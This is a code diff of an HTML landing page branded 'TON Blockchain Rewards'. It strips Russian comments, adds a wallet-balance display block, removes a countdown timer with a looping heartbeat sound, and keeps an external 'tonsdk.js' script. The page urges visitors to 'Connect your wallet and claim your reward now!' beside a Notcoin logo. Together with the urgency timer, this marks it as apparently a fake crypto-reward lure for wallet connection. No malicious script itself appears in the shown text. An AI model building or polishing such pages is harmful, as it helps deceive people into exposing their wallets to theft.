@@ -55,7 +55,7 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 30px; /* Добавлено расстояние между элементами */
+            gap: 30px;
         }
 
         button {
@@ -68,7 +68,7 @@
             cursor: pointer;
             transition: 0.3s;
             box-shadow: 0 0 10px #00aaff;
-            margin-bottom: 30px; /* Увеличено расстояние между кнопкой и логотипами */
+            margin-bottom: 30px;
         }
 
         button:hover {
@@ -78,7 +78,7 @@
 
         #logos {
             display: flex;
-            gap: 30px; /* Увеличено расстояние между логотипами */
+            gap: 30px;
             margin-top: 20px;
             justify-content: center;
         }
@@ -92,8 +92,8 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 30px; /* Увеличено расстояние между логотипами */
-            margin-top: 20px; /* Немного отступили от предыдущего контента */
+            gap: 30px;
+            margin-top: 20px;
         }
 
         .dynamic-logo {
@@ -131,6 +131,11 @@
             color: #ff4444;
             margin-top: 20px;
         }
+
+        #wallet-info {
+            font-size: 18px;
+            margin-bottom: 30px; /* Место для отображения баланса */
+        }
     </style>
 </head>
 <body>
@@ -141,6 +146,8 @@
     
     <main>
         <div id="subtitle">Connect your wallet and claim your reward now!</div>
+
+        <div id="wallet-info"></div> <!-- Блок для отображения баланса -->
 
         <div id="dynamic-logos">
             <img class="dynamic-logo" src="notcoin_logo.png" alt="Notcoin">
@@ -163,43 +170,12 @@
     <footer>
         © 2025 TON Blockchain Rewards | All rights reserved
     </footer>
-    
+
     <div id="wallet-info"></div>
 
     <!-- Heartbeat Sound -->
     <audio id="heartbeat-sound" src="heartbeat_sound.mp3" loop></audio>
 
-    <script>
-        function startCountdown() {
-            let timeLeft = 60;
-            const timerElement = document.getElementById('timer');
-            
-            const countdownInterval = setInterval(() => {
-                timeLeft--;
-                timerElement.textContent = timeLeft;
-                
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    timerElement.textContent = "Time expired!";
-                    stopHeartbeatSound();  // Stop the heartbeat sound when time runs out
-                }
-            }, 1000);
-        }
-        
-        function stopHeartbeatSound() {
-            const heartbeatSound = document.getElementById('heartbeat-sound');
-            heartbeatSound.pause(); // Pause the sound
-            heartbeatSound.currentTime = 0; // Reset sound to the beginning
-        }
-
-        // Start the countdown and the heartbeat sound when the page loads
-        startCountdown();
-
-        const heartbeatSound = document.getElementById('heartbeat-sound');
-        heartbeatSound.loop = true; // Enable looping
-        heartbeatSound.play(); // Play the sound in a loop
-    </script>
-    
     <script src="tonsdk.js"></script>
-</body>
+</body>  
 </html>
